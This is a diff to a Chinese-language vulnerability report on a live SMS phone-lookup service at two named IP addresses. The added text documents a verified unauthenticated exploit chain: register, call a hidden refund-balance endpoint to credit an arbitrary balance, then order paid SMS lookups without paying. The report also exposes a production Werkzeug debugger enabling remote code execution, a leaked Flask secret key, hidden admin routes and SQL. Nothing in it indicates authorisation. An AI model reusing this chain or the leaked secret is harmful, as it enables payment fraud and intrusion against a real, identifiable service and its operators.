@@ -1,11 +1,44 @@
 # 漏洞深挖报告 — 一码快查 (9110 + 8081)
 
-探测时间：2026-07-06  
+探测时间：2026-07-06 ~ 2026-07-07  
 目标：`43.154.128.116:9110`（Flask 计费）、`47.76.163.227:8081`（.NET SMS）
 
 ---
 
 ## CRITICAL
+
+### 0. 未鉴权无限加余额 `/api/desktop/refund-balance`（已实机打通全链）
+
+**发现**：Werkzeug 调试页在 `decrease-balance` 异常栈的 **下一行** 泄露隐藏路由；对 `refund-balance` 传 `amount: "NaN"` 可再泄露 handler 源码（line ~635）。
+
+**接口**：`POST /api/desktop/refund-balance`  
+**鉴权**：无  
+**Body**：`{"username":"<任意已注册 user>","amount":9999}`
+
+**泄露 SQL（debugger line 635）**：
+
+```sql
+UPDATE accounts SET balance = balance + ? WHERE username = ? AND account_type = 'user'
+```
+
+**实测**：
+
+```json
+{"ok": true, "amount": 9999.0}
+```
+
+**完整利用链（已验证）**：
+
+1. `POST /api/desktop/register` 注册账号  
+2. `POST /api/desktop/refund-balance` 任意加余额（0 → 9999）  
+3. `POST /api/desktop/decrease-balance` 扣 3 元/次  
+4. `POST http://47.76.163.227:8081/create/{api_secret}` 下单 SMS  
+
+工具：`tools/free_recharge_chain.py`、`tools/exploit_poc.py`
+
+**影响**：攻击者可 **完全绕过付费**，无限使用 3 元/次的查号服务，无需卡密、无需管理员权限。
+
+---
 
 ### 1. 生产环境开启 Werkzeug Debugger（可导致 RCE）
 
@@ -20,9 +53,9 @@
 | Flask `SECRET` | `pohZc8RrQkczwHyYZUbX` |
 | 部署路径 | `/home/试试看洋芋的新的查具体后台/` |
 | 源码文件 | `/home/试试看洋芋的新的查具体后台/app.py` |
-| 函数 | `api_desktop_decrease_balance`（约第 613 行） |
+| 函数 | `api_desktop_decrease_balance`（~613）、`api_desktop_refund_balance`（~635） |
 | 数据库表 | `accounts`（字段 `balance`, `username`, `account_type`） |
-| 隐藏路由 | `@app.route("/admin/delete-cards", methods=["POST"])` |
+| 隐藏路由 | `POST /admin/delete-cards`、`POST /api/desktop/refund-balance` |
 
 **SQL 片段（来自调试页源码上下文）**：
 
